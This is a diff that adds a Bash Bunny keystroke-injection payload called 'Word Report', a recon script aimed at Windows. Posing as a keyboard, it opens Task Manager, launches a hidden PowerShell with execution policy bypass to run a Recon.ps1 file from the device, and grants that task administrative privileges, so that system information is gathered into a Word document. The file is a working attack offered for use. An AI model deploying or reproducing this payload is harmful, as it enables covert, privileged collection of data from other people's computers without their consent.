@@ -1,0 +1,38 @@
+# Title:       	Word Report
+# Description:  This payload in similar to the InfoGrabber payload. But save slightly different info to a MS Word document.
+# Author:       Cribbit
+# Version:      1.0
+# Category:     Recon
+# Target:       Windows (Powershell 5.1+)
+# Attackmodes:	HID & STORAGE	
+
+LED SETUP
+
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+LED ATTACK
+
+Q DELAY 200
+# Opens Task Manager 
+Q CTRL-SHIFT ESC
+Q DELAY 100
+# Opens "More details" to show menu (can not use alt d as this toggle and my hide the menu if already open).
+Q SHIFT TAB
+Q SPACE
+# Selects "&File"
+Q ALT f
+# Selects "Run &new task"
+Q STRING n
+Q DELAY 100
+Q STRING "powershell -Noni -NoP -W h -EP Bypass .((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\Recon.ps1')"
+# Set Create this task with administrative privileges
+Q DELAY 100
+Q TAB
+Q DELAY 100
+Q SPACE
+Q DELAY 100
+# Run
+Q ENTER
+
+LED FINISH
